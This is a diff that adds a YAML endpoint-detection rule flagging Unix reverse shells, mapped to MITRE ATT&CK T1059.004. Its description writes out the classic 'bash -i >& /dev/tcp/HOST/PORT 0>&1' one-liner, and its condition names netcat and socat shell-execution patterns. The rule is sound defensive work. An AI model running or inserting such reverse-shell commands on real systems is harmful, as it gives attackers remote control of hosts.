@@ -1,0 +1,30 @@
+name: Interactive shell redirected to a network socket
+id: 1b2b2f2f-9950-41a7-82f0-9d54e5f7cf1e
+version: 1.0.0
+platforms: [linux]
+description: |
+  A shell was started with a command line that redirects it to /dev/tcp or /dev/udp
+  (bash -i >& /dev/tcp/HOST/PORT 0>&1), or a netcat/socat was told to run a shell: the
+  classic one-line reverse shell after a web or service exploit.
+  Known benign: rare; network tests in scripts sometimes use /dev/tcp for port checks
+  (without -i).
+labels:
+  tactic.id: TA0002
+  tactic.name: Execution
+  technique.id: T1059.004
+  technique.name: Unix Shell
+references:
+  - https://attack.mitre.org/techniques/T1059/004/
+condition: >
+  evt.name = 'CreateProcess'
+  and (
+    (ps.name in ('bash', 'sh', 'dash', 'zsh', 'ksh') and ps.cmdline imatches ('*/dev/tcp/*', '*/dev/udp/*') and ps.cmdline imatches ('*-i*', '*0>&1*', '*>&*'))
+    or (ps.name in ('nc', 'ncat', 'netcat', 'nc.traditional') and ps.args in ('-e', '-c') and ps.cmdline imatches ('*sh*'))
+    or (ps.name = 'socat' and ps.cmdline imatches ('*exec:*sh*', '*system:*sh*'))
+  )
+output: "%ps.exe (pid %ps.pid, parent %ps.parent.exe, user %ps.username) reverse shell: %ps.cmdline"
+severity: critical
+action: []
+tests:
+  atomic: []
+min-engine-version: 0.1.0
